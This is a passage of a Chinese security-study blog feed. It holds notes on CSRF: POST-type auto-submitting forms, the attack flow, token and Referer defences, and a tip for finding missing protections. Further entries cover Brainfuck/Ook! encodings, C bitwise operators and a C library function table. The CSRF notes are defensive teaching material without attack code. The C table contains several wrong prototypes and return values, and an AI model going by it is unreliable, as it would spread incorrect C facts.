<h3 id="2-POST型"><a href="#2-POST型" class="headerlink" title="2.POST型"></a>2.POST型</h3><ul>
<li>这类型的csrf利用起来通常是使用一个自动提交的表单</li>
<li>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</li>
</ul>
<blockquote>
<p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p>
</blockquote>
<hr>
<h2 id="原理及过程"><a href="#原理及过程" class="headerlink" title="原理及过程"></a>原理及过程</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p>
<p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p>
<p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B</p>
<p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A</p>
<p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下==携带Cookie信息==，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
<hr>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>验证HTTP Referer字段</li>
</ol>
<ul>
<li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。而如果黑客要对网站实施 CSRF 攻击，他只能在他自己的网站构造请求，该请求的 Referer 是指向黑客自己的网站。网站只需要对于每一个请求验证其 Referer 值如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<blockquote>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
</blockquote>
</li>
</ul>
<p>2.在请求地址中添加 token 并验证(Anti-CSRF token)</p>
<ul>
<li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下<font color="green">直接利用用户自己的 cookie 来通过安全验证。</font></li>
<li>要抵御 CSRF，关键在于在++请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中++。可以在 HTTP 请求中以参数的形式加入一个==随机产生的 token==，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 <blockquote>
<p>token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p>
</blockquote>
</li>
</ul>
<p>3.在 HTTP 头中自定义属性并验证</p>
<ul>
<li>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过==XMLHttpRequest==这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 token 值放入其中。</li>
</ul>
<hr>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1：最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</p>
<p>2：如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>代码审计</category>
        <category>漏洞挖掘</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>CTF</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Brainfuck&amp;Ook!加密</title>
    <url>/2019/10/26/Brainfuck&amp;Ook%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Brainfuck-Ook-编码加密"><a href="#Brainfuck-Ook-编码加密" class="headerlink" title="Brainfuck/Ook!编码加密"></a>Brainfuck/Ook!编码加密</h1><hr>
<h2 id="Ook-加密"><a href="#Ook-加密" class="headerlink" title="Ook!加密"></a>Ook!加密</h2><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>OOK！只有三个不同的语法元素：<br>Ook。<br>OOK？<br>OOK！</p>
<a id="more"></a>

<p>它们组合成两个组，各种组合组合指定命令。因此，节目必须包含偶数个“Ook”。换行符被忽略</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>OOK。OOK？<br>将内存指针移动到下一个阵列单元格。</p>
<p>OOK？OOK。<br>将内存指针移动到上一个阵列单元格。</p>
<p>OOK。OOK。<br>增加内存指针指向的数组单元格。</p>
<p>OOK！OOK！<br>减少内存指针指向的数组单元格。</p>
<p>OOK。OOK！<br>从STDIN读取一个字符并将其ASCII值放入Memory指针指向的单元格中。</p>
<p>OOK！OOK。<br>打印ASCII值等于内存指针指向的单元格中的值的字符。</p>
<p>OOK！OOK？<br>移动到匹配的Ook之后的命令？OOK！如果存储器指针指向的单元格中的值为零。注意Ook！OOK？和欧克？OOK！命令嵌套像括号一样，匹配对的定义方式与括号相同。</p>
<p>OOK？OOK！<br>移动到匹配的Ook之后的命令！OOK？如果存储器指针指向的单元格中的值不为零。</p>
<hr>
<p>密文形式一（常见）：</p>
<pre><code>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </code></pre><p>密文形式二（不常见）：</p>
<pre><code>..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .....
..... ..... ..... ..... ..... ..... !.?.. ..... ..!?! !.?!! !!!!! !?.?!
.?!!! !!... ..... ..... ..!.! !!!!! !!!!! !!!!! !!!.? ..... ..!?! !.?..
....? .?!.? ..... .!.!! !!!.! !!!!! !!!!! !!!!! !.?.. ..... ..... .....
!?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. ?.... ..... ..... .....
!?!!. ?.... ..... ..... ....? .?!.? ..... .!.!! !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!! !!!!! !!!!!
!!!!! !!.?. ..... ..... !?!!. ?.... ..... .?.?! .?... ..... ..... .....
..!.? ..... ....! ?!!.? ..... ...?. ?!.?. .!.?. ..... .!?!! .?!!! !!!?.
?!.?! !!!!! !!!!! .?.</code></pre><hr>
<h2 id="Brainfuck加密"><a href="#Brainfuck加密" class="headerlink" title="Brainfuck加密"></a>Brainfuck加密</h2><h3 id="语法规则-1"><a href="#语法规则-1" class="headerlink" title="语法规则"></a>语法规则</h3><p>Brainfuck编程语言由八个命令组成，每个命令都表示为一个字符。</p>
<p>递增指针：&gt;</p>
<p>减少指针：&lt;</p>
<p>递增指针处的字节：+</p>
<p>减少指针处的字节：-</p>
<p>输出指针处的字节：。</p>
<p>输入一个字节并将其存储在指针的字节中：，</p>
<p>如果指针处的字节为零，则跳过匹配]：[</p>
<p>向后跳转到匹配[除非指针处的字节为零：]</p>
<hr>
<p><font color="green">Brainfuck命令的语义也可以用C语言简洁地表达</font>，如下所示（假设p先前已被定义为char *）：</p>
<ul>
<li>++ p : &gt;</li>
</ul>
<ul>
<li><p>–p  : &lt;</p>
</li>
<li><p>++ * p : +</p>
</li>
<li><p>– * p : -</p>
</li>
<li><p>putchar（* p）: 。</p>
</li>
<li><p>*p = getchar（）: ，</p>
</li>
<li><p>while（* p）{ : [</p>
</li>
<li><p>} : ]</p>
</li>
</ul>
<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;
]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----
-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-
&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++
+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++
++.&lt;</code></pre><p><strong>这两种加密方式的解密网站是同一个：</strong><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
]]></content>
      <categories>
        <category>密码学</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言位运算符学习</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h1><p>[Toc]</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a><strong>概念</strong></h2><ul>
<li>位运算是指按二进制进行的运算。</li>
<li>C语言提供了6个位操作运算符。这些运算符只能用于整型操作数，即只能用于带符号或无符号的char,short,int与long类型。</li>
</ul>
<a id="more"></a>

<p>======================================</p>
<h2 id="C语言提供的位运算符列表"><a href="#C语言提供的位运算符列表" class="headerlink" title="C语言提供的位运算符列表"></a><strong>C语言提供的位运算符列表</strong></h2><table>
<thead>
<tr>
<th>运算符</th>
<th>含义</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>按位与</td>
<td>如果两个相应的二进制位都为1，则该位的结果值为1，否则为0</td>
</tr>
<tr>
<td>l</td>
<td>按位或</td>
<td>两个相应的二进制位中只要有一个为1，该位的结果值为1</td>
</tr>
<tr>
<td>^</td>
<td>按位异或</td>
<td>若参加运算的两个二进制位值相同则为0，否则为1</td>
</tr>
<tr>
<td>~</td>
<td>取反</td>
<td>~是一元运算符，用来对一个二进制数按位取反，即将0变1，将1变0</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移</td>
<td>用来将一个数的各二进制位全部左移N位，右补0</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移</td>
<td>将一个数的各二进制位右移N位，移到右端的低位被舍弃，对于无符号数，高位补0</td>
</tr>
</tbody></table>
<hr>
<h2 id="按位与运算符"><a href="#按位与运算符" class="headerlink" title="按位与运算符"></a><strong>按位与运算符</strong></h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul>
<li>按位与是指：参加运算的两个数据，按二进制位进行“与”运算。如果两个相应的二进制位都为１，则该位的结果值为1；否则为0。</li>
<li>按位与其实与逻辑上“与”的运算规则一致。逻辑上的“与”，要求运算数全真，结果才为真。若，A=true,B=true,则A∩B=true </li>
<li>例如：3&amp;5 3的二进制编码是11(2)。（为了区分十进制和其他进制，凡是非十进制的数据均在数据后面加上括号，括号中注明其进制，二进制则标记为2）内存储存数据的基本单位是字节（Byte），一个字节由8个位（bit)所组成。位是用以描述电脑数据量的最小单位。二进制系统中，每个0或1就是一个位。将11（2）补足成一个字节，则是00000011（2）。5的二进制编码是101（2），将其补足成一个字节，则是00000101（2）</li>
</ul>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>1）清零</p>
<p>若想对一个存储单元清零，即使其全部二进制位为0，只要找一个二进制数</p>
<blockquote>
<p>原来的数中为1的位，新数中相应位为0。然后使二者进行&amp;运算，即可达到清零目的</p>
</blockquote>
<p>2）取一个数中某些指定位</p>
<p>若有一个整数a(2byte),想要取其中的低字节，只需要将a与8个1按位与即可</p>
<p>3）保留指定位：</p>
<p>与一个数进行“按位与”运算，此数在该位取1.</p>
<hr>
<hr>
<h2 id="按位或运算符"><a href="#按位或运算符" class="headerlink" title="按位或运算符"></a><strong>按位或运算符</strong></h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><ul>
<li>两个相应的二进制位中只要有一个为1，该位的结果值为1。</li>
</ul>
<hr>
<hr>
<h2 id="异或运算符"><a href="#异或运算符" class="headerlink" title="异或运算符"></a><strong>异或运算符</strong></h2><ul>
<li>1.使特定位翻转</li>
<li>2.保留原值（与0相异或）</li>
<li>3.交换两个值不用临时变量</li>
</ul>
<hr>
<hr>
<h2 id="取反运算符"><a href="#取反运算符" class="headerlink" title="取反运算符"></a><strong>取反运算符</strong></h2><ul>
<li>用于求整数的二进制反码，即分别将操作数各二进制位上的1变为0，0变为1。</li>
</ul>
<hr>
<hr>
<h2 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符"></a><strong>左移运算符</strong></h2><ul>
<li>左移运算符是用来将一个数的各二进制位左移若干位，移动的位数由右操作数指定（右操作数必须是非负值），其右边空出的位用0填补，高位左移溢出则舍弃该高位。</li>
</ul>
<hr>
<hr>
<h2 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符"></a><strong>右移运算符</strong></h2><ul>
<li>右移运算符是用来将一个数的各二进制位右移若干位，移动的位数由右操作数指定（右操作数必须是非负<br>值），移到右端的低位被舍弃，</li>
<li>对于无符号数，高位补0。</li>
<li>对于有符号数，某些机器将对左边空出的部分<br>用符号位填补（即“算术移位”），而另一些机器则对左边空出的部分用0填补（即“逻辑移位”）。</li>
<li>注意：对无符号数,右移时左边高位移入0；对于有符号的值,如果原来符号位为0(该数为正),则左边也是移入0。如果符号位原来为1(即负数),则左边移入0还是1,要取决于所用的计算机系统。有的系统移入0,有的系统移入1。移入0的称为“逻辑移位”,即简单移位；移入1的称为“算术移位”。</li>
</ul>
<hr>
<hr>
<h2 id="位运算赋值运算符"><a href="#位运算赋值运算符" class="headerlink" title="位运算赋值运算符"></a><strong>位运算赋值运算符</strong></h2><ul>
<li>位运算符与赋值运算符可以组成复合赋值运算符。</li>
</ul>
<blockquote>
<p>例如: &amp;=, |=, &gt;&gt;=, &lt;&lt;=, ∧=</p>
</blockquote>
]]></content>
      <categories>
        <category>C语言</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言库函数学习</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%BA%93%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="C语言库函数"><a href="#C语言库函数" class="headerlink" title="C语言库函数"></a>C语言库函数</h1><p>[Toc]</p>
<h2 id="1-数学函数"><a href="#1-数学函数" class="headerlink" title="1.数学函数"></a><strong>1.数学函数</strong></h2><ul>
<li>使用数学函数时，应在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;math.h></span> </span></code></pre>
</li>
</ul>
<a id="more"></a>

<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>acos</td>
<td>double acos(double x)</td>
<td>计算arccos x的值，其中-1&lt;=x&lt;=1</td>
<td>计算结果</td>
</tr>
<tr>
<td>asin</td>
<td>double asin(double x)</td>
<td>计算arcsin x的值，其中-1&lt;=x&lt;=1</td>
<td>计算结果</td>
</tr>
<tr>
<td>atan</td>
<td>double atan(double x)</td>
<td>计算arctan x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>atan2</td>
<td>double atan2(double x,double y)</td>
<td>计算arctan x/y的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>cos</td>
<td>double cos(double x)</td>
<td>计算cos x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>cosh</td>
<td>double cosh(double x)</td>
<td>计算x的双曲余弦cosh x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>exp</td>
<td>double exp(double x)</td>
<td>求e^x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>fabs</td>
<td>double fabs(double x)</td>
<td>求x的绝对值</td>
<td>计算结果</td>
</tr>
<tr>
<td>floor</td>
<td>double floor(double x)</td>
<td>求出不大于x的最大整数</td>
<td>该整数的双精度实数</td>
</tr>
<tr>
<td>fmod</td>
<td>double fmod(double x,double y);</td>
<td>求整除x/y的余数</td>
<td>返回余数的双精度实数</td>
</tr>
<tr>
<td>frexp</td>
<td>double frexp(double val,int *eptr)</td>
<td>把双精度数val分解成数字部分(尾数)和以2为底的指数，即val=x * 2^n,n存放在eptr指向的变量中</td>
<td>数字部分x 0.5 &lt;= x &lt; 1</td>
</tr>
<tr>
<td>log</td>
<td>double log(double x)</td>
<td>求ln x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>log10</td>
<td>double log10(double x)</td>
<td>求log10x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>modf</td>
<td>double mof(double val,int * iptr)</td>
<td>把双精度数val分解成数字部分和小数部分，把整数部分存放在ptr指向的变量中</td>
<td>val的小数部分</td>
</tr>
<tr>
<td>pow</td>
<td>double pow(double x,double y)</td>
<td>求x^y的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>sin</td>
<td>double sin(double x)</td>
<td>求sin x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>sinh</td>
<td>double sinh(double x)</td>
<td>计算x的双曲正弦函数sinh x的值</td>
<td>计算结果</td>
</tr>
<tr>
<td>sqrt</td>
<td>double sqrt(double x)</td>
<td>计算，其中x&gt;=0</td>
<td>计算结果</td>
</tr>
<tr>
<td>tan</td>
<td>double tan(double x)</td>
<td>计算tan x的值,其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
<tr>
<td>tanh</td>
<td>double tanh(double x)</td>
<td>计算tanh x的值，其中x的单位为弧度</td>
<td>计算结果</td>
</tr>
</tbody></table>
<hr>
<h2 id="2-字符函数"><a href="#2-字符函数" class="headerlink" title="2.字符函数"></a><strong>2.字符函数</strong></h2><ul>
<li>在使用字符函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>isalnum</td>
<td>int isalnum(int ch)</td>
<td>检查ch是否字母或数字</td>
<td>是则返回1，否则返回0</td>
</tr>
<tr>
<td>isalpha</td>
<td>int isalpha(int ch)</td>
<td>检查ch是否为字母</td>
<td>是字母返回1，否则返回0</td>
</tr>
<tr>
<td>iscntrl</td>
<td>int iscntrl(int ch)</td>
<td>检查ch是否控制字符（其ASCII码在0和0xLF之间)</td>
<td>是控制字符返回1，否则返回0</td>
</tr>
<tr>
<td>isdigit</td>
<td>int isdigit(int ch)</td>
<td>检查ch是否为数字</td>
<td>是数字返回1，否则返回0</td>
</tr>
<tr>
<td>isgraph</td>
<td>int isgraph(int ch)</td>
<td>检查ch是否可打印字符（其ASCII码在0x21和0x7e之间），不包括空格</td>
<td>可打印字符返回1，否则返回0</td>
</tr>
<tr>
<td>islower</td>
<td>int islower(int ch)</td>
<td>检查ch是否是小写字母(a~z)</td>
<td>是小写字母返回1，否则返回0</td>
</tr>
<tr>
<td>isprint</td>
<td>int print(int ch)</td>
<td>检查ch是否是可打印字符（其ASCII码在0x21和0x7e之间),不包括空格</td>
<td>可打印字符返回1，否则返回0</td>
</tr>
<tr>
<td>ispunct</td>
<td>int ispunct(int ch)</td>
<td>检查ch是否是标点字符（不包括空格）即除字母、数字和空格以外的所有可打印字符</td>
<td>是标点返回1，否则返回0</td>
</tr>
<tr>
<td>isspace</td>
<td>int isspace(int ch)</td>
<td>检查ch是否空格、制表符或换行符</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>isupper</td>
<td>int isupper(int ch)</td>
<td>检查ch是否大写字母(A~Z)</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>isxdigit</td>
<td>int isxdigit(int ch)</td>
<td>检查ch是否一个16进制数字(即0<del>9，或A</del>F,a~f)</td>
<td>是返回1，否则返回0</td>
</tr>
<tr>
<td>tolower</td>
<td>int tolower(int ch)</td>
<td>将ch字符转换为小写字母</td>
<td>返回ch对应的小写字母</td>
</tr>
<tr>
<td>toupper</td>
<td>int toupper(int ch)</td>
<td>将ch字符转换为大写字母</td>
<td>返回ch对应的大写字母</td>
</tr>
</tbody></table>
</li>
</ul>
<hr>
<h2 id="3-字符串函数"><a href="#3-字符串函数" class="headerlink" title="3.字符串函数"></a><strong>3.字符串函数</strong></h2><ul>
<li>在使用字符串函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></code></pre>
<img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538569387148&di=fa4604d28b80f7d5b8031101d952c7c7&imgtype=0&src=http%3A%2F%2Fwww.68idc.cn%2Fhelp%2Fuploads%2Fallimg%2F150116%2F151FMW7_0.jpg" alt></li>
</ul>
<hr>
<h2 id="4-输入输出函数"><a href="#4-输入输出函数" class="headerlink" title="4.输入输出函数"></a><strong>4.输入输出函数</strong></h2><ul>
<li>在使用输入输出函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></code></pre>
</li>
</ul>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>clearerr</td>
<td>void clearerr(FILE *fp)</td>
<td>清除文件指针错误提示器</td>
<td>无</td>
</tr>
<tr>
<td>close</td>
<td>int close(int fp)</td>
<td>关闭文件（非ANSI标准)</td>
<td>关闭成功返回0，不成功返回-1</td>
</tr>
<tr>
<td>creat</td>
<td>int creat(char*filename,int mode)</td>
<td>以mode所指定的方式建立文件（非ANSI标准）</td>
<td>成功返回正数，否则返回-1</td>
</tr>
<tr>
<td>eof</td>
<td>int eof（int fp)</td>
<td>判断fp所指的文件是否结束</td>
<td>文件结束返回1，否则返回0</td>
</tr>
<tr>
<td>fclose</td>
<td>int fclose（FILE * fp)</td>
<td>关闭fp所指的文件，释放文件缓冲区</td>
<td>关闭成功返回0，不成功返回非0</td>
</tr>
<tr>
<td>feof</td>
<td>int feof(FILE * fp)</td>
<td>检查文件是否结束</td>
<td>结束返回非0，否则返回0</td>
</tr>
<tr>
<td>ferror</td>
<td>int ferror(FILE * fp)</td>
<td>测试fp所指文件是否错误</td>
<td>无错返回0，否则返沪非0</td>
</tr>
<tr>
<td>fflush</td>
<td>int fflush(FILE * fp)</td>
<td>将fp所指的文件的全部控制信息和数据存盘</td>
<td>存盘正确返回0，否则返回非0</td>
</tr>
<tr>
<td>fgets</td>
<td>char *fgets(char *buf,int n,FILE *fp)</td>
<td>从fp所指的文件读取一个长度为(n-1)的字符串，存入起始地址为buf的空间</td>
<td>返回地址buf。若遇文件结束或出错则返回E0F</td>
</tr>
<tr>
<td>fopen</td>
<td>FILE *fopen(char *filename, char *mode)</td>
<td>以mode指定的方式打开名为filename的文件</td>
<td>成功，则返回一个文件指针，否则返回0</td>
</tr>
<tr>
<td>fprintf</td>
<td>int fprintf(FILE * fp, char *format,args,…)</td>
<td>把args的值以format指定的格式输出到fp所指的文件中</td>
<td>实际输出的字符数</td>
</tr>
<tr>
<td>fputc</td>
<td>int putc(char ch,FILE * fp)</td>
<td>将字符ch输出到fp所指的文件中</td>
<td>成功返回该字符，出错返回E0F</td>
</tr>
<tr>
<td>fputs</td>
<td>int fputs(char str,FILE * fp)</td>
<td>将str指定的字符串输出到fp所指的文件中</td>
<td>成功则返回0，出错则返回E0F</td>
</tr>
<tr>
<td>fread</td>
<td>int fread(char *pt, unsigned size,unsigned n,FILE * fp)</td>
<td>从fp所定文件中读取长度为size的n个数据项，存放到pt所指向的内存区</td>
<td>返回所读的数据项个数，若文件结束或出错返回0</td>
</tr>
<tr>
<td>fscanf</td>
<td>int fscanf(FILE * fp,char *format,args,…)</td>
<td>从fp指定的文件中按给定的format格式将读入的数据送到args所指向的内存变量中(args是指针)</td>
<td>输入的数据个数</td>
</tr>
<tr>
<td>fseek</td>
<td>int fseek(FILE * fp,long offset,int base)</td>
<td>将fp指定的文件的位置指针移到base所指出的位置为基准，以offset为位移量的位置</td>
<td>返回当前位置，否则返回-1</td>
</tr>
<tr>
<td>ftell</td>
<td>long ftell(FILE * fp)</td>
<td>返回fp所指定的文件中的读写位置</td>
<td>返回文件中的读写位置，否则返回0</td>
</tr>
<tr>
<td>fwrite</td>
<td>int fwrite(char *ptr,unsigned size,unsigned n,FILE * fp)</td>
<td>把ptr所指向的的n * size个字节输出到fp所指向的文件中</td>
<td>写到fp文件中的数据项的个数</td>
</tr>
<tr>
<td>getc</td>
<td>int getc(FILE * fp)</td>
<td>从fp所指向的文件中的独处下一个字符</td>
<td>返回读出的字符，若文件出错或结束返回E0F</td>
</tr>
<tr>
<td>getchar</td>
<td>int getchar()</td>
<td>从标准输入设备中读取下一个字符</td>
<td>返回字符，若文件出错或结束返回-1</td>
</tr>
<tr>
<td>gets</td>
<td>char *gets(char *str)</td>
<td>从标准输入设备中读取字符串存入str指向的数组</td>
<td>成功返回str，否则返回NULL</td>
</tr>
<tr>
<td>open</td>
<td>int open(char *filename, int mode)</td>
<td>以mode指定的方式打开已存在的名为filename的文件（非ANSI标准）</td>
<td>返回文件号（正数），如打开失败返回-1</td>
</tr>
<tr>
<td>printf</td>
<td>int printf(char *format,args,…)</td>
<td>在format指定的字符串的控制下，将输出列表args的指输出到标准设备</td>
<td>输出字符的个数。若出错返回负数</td>
</tr>
<tr>
<td>prtc</td>
<td>int prtc(int ch,FILE *fp)</td>
<td>把一个字符ch输入到fp所指的文件中</td>
<td>输出字符ch，若出错返回E0F</td>
</tr>
<tr>
<td>putchar</td>
<td>int putchar(char ch)</td>
<td>把字符ch输出到fp标准输出设备</td>
<td>返回换行符，若失败返回E0F</td>
</tr>
<tr>
<td>puts</td>
<td>int puts(char *str)</td>
<td>把str指向的字符串输出到标准输入设备，将”/0”转换为回车行</td>
<td>返回换行符，若失败返回E0F</td>
</tr>
<tr>
<td>putw</td>
<td>int putw(int w,FILE *fp)</td>
<td>将一个整数i（即一个字）写到fp所指文件中（非ANSI标准）</td>
<td>返回读出的字符，若文件出错或结束返回E0F</td>
</tr>
<tr>
<td>read</td>
<td>int read(int fd,char *buf,unsigned count)</td>
<td>从文件号fp所指定的文件中读count个字节到buf知识的缓冲区（非ANSI标准）</td>
<td>返回真正读出的字节个数，如文件结束返回0，出错返回-1</td>
</tr>
<tr>
<td>remove</td>
<td>int remove(char *fname)</td>
<td>删除以fname为文件名的文件</td>
<td>成功返回0，出错返回-1</td>
</tr>
<tr>
<td>rename</td>
<td>int remove(char *oname,char *nname)</td>
<td>把oname所指的文件名改为y由nname所指的文件名</td>
<td>成功返回0，出错返回-1</td>
</tr>
<tr>
<td>rewind</td>
<td>void rewind（FILE *fp)</td>
<td>将fp指定的文件指针置于文件头，并清除文件结束标志和错误标志</td>
<td>无</td>
</tr>
<tr>
<td>scanf</td>
<td>int scanf(char *format,args,…)</td>
<td>从标准输入设备按format指示的格式字符串规定的格式，输入数据给args所指示的单元，args为指针</td>
<td>读入并附给args数据个数。如文件结束返回E0F，若出错返回0</td>
</tr>
<tr>
<td>write</td>
<td>int write(int fd,char *buf,unsigned count)</td>
<td>从buf指示的缓冲区输出count个字符到fd所指的文件中（非ANSI标准）</td>
<td>返回实际输入的字节数，如出错返回-1</td>
</tr>
</tbody></table>
<hr>
<h2 id="5-动态储存分配函数"><a href="#5-动态储存分配函数" class="headerlink" title="5.动态储存分配函数"></a><strong>5.动态储存分配函数</strong></h2><ul>
<li>在使用动态储存分配函数时，应该在源文件中使用预编译命令：<pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdib<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>功能</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>calloc</td>
<td>void *calloc(unsigned n,unsigned size)</td>
<td>分配n个数据项的内存连续空间，每个数据项的大小为size</td>
<td>分配内存单元的起始地址。如不成功返回0</td>
</tr>
<tr>
<td>free</td>
<td>void free(void *p)</td>
<td>释放p所指的内存区</td>
<td>无</td>
</tr>
<tr>
<td>malloc</td>
<td>void *malloc(unsigned size)</td>
<td>分配size字节的内存区</td>
